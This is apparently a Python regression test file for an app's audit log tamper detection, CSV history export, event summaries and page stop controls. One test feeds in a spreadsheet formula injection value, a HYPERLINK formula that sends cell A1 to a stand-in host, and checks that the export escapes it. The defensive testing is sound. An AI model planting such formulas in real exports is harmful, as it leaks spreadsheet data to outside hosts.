"""Regression tests for the review issues fixed on fix/review-b (one small test per issue)."""

import json
import re
from pathlib import Path

STATIC = Path(__file__).resolve().parent.parent / "trova" / "static"


# ---------------------------------------------------------------- audit log (#13, #14, #33)
def test_audit_verify_after_ten_named_objects(tmp_path):                       # 13
    from trova.audit import AuditLog
    a = AuditLog(tmp_path)
    a.event("reference", n_objects=12, names={i: f"object {i}" for i in range(1, 13)})
    a.event("signoff", operator="Ana", decision="approve")
    assert a.verify()["ok"]


def test_audit_anchor_detects_tail_deletion_stripped_hashes_and_prepends(tmp_path):   # 14
    from trova.audit import AuditLog

    def fresh(name):
        a = AuditLog(tmp_path / name)
        for k in ("reference", "change_check", "signoff", "signoff"):
            a.event(k, decision="reject")
        assert a.verify()["ok"]
        log = tmp_path / name / "events.jsonl"
        return a, log, log.read_text().splitlines()

    _, log, lines = fresh("tail")
    log.write_text("\n".join(lines[:-2]) + "\n")                # server stopped, the last 2 sign-offs deleted
    v = AuditLog(tmp_path / "tail").verify()
    assert not v["ok"] and "deleted" in v["reason"]

    _, log, lines = fresh("stripped")
    stripped = []
    for line in lines:
        e = json.loads(line)
        e.pop("hash")
        e["decision"] = "approve"
        stripped.append(json.dumps(e))
    log.write_text("\n".join(stripped) + "\n")                  # every hash removed, decisions rewritten
    assert not AuditLog(tmp_path / "stripped").verify()["ok"]

    a, log, lines = fresh("prepend")
    log.write_text(json.dumps({"id": "x", "kind": "signoff", "decision": "approve"}) + "\n" + "\n".join(lines) + "\n")
    assert not a.verify()["ok"]                                  # unhashed line prepended while running
    assert not AuditLog(tmp_path / "prepend").verify()["ok"]     # and after a restart

    _, log, _ = fresh("deleted")
    log.unlink()
    assert not AuditLog(tmp_path / "deleted").verify()["ok"]     # the whole log deleted


def test_audit_torn_last_line_is_quarantined(tmp_path):                       # 33
    from trova.audit import AuditLog
    a = AuditLog(tmp_path)
    a.event("reference", n_objects=1)
    with (tmp_path / "events.jsonl").open("a") as f:
        f.write('{"id": "abc", "kind": "sig')                    # killed mid-write
    b = AuditLog(tmp_path)
    b.event("signoff", operator="Ana", decision="reject")
    assert b.all()[-1]["kind"] == "signoff" and b.verify()["ok"]
    assert '"sig' in (tmp_path / "events.partial").read_text()


# ---------------------------------------------------------------- history page (#34, #35, #53, #57)
def test_history_csv_cells_are_not_formulas():                                 # 34
    from trova.history import to_csv
    rows = [{"time": "t", "id": "1", "kind": "find", "group": "finds", "what": '=HYPERLINK("http://x/?"&A1,"open")',
             "result": "+1", "image": None}]
    cells = to_csv(rows).splitlines()[1]
    assert "'=HYPERLINK" in cells and ",'+1," in cells


def test_history_csv_link_is_not_capped():                                     # 35
    html = (STATIC / "history.html").read_text()
    href = re.search(r"\$\('csv'\)\.href = (.*);", html).group(1)
    assert "qs" not in href and "n:" not in href


def test_history_shows_operator_resets_and_lift_recoveries():                  # 53
    from trova.history import summarize
    s = summarize({"kind": "arm_lift_recovery", "operator": "staff-ana", "note": "fork freed by hand"})
    assert s["group"] == "arm" and "staff-ana" in s["result"] and "fork freed" in s["result"]
    assert summarize({"kind": "arm_reset", "operator": "staff-ana"})["group"] == "arm"
    assert summarize({"kind": "teach_pose", "name": "home_joints"})["group"] == "setup"


def test_jury_and_history_pages_have_stop():                                   # 57
    for page in ("jury.html", "history.html"):
        html = (STATIC / page).read_text()
        assert 'id="stop"' in html and "/api/arm/stop" in html
        assert "keydown" in html and "Escape" in html and "Space" in html
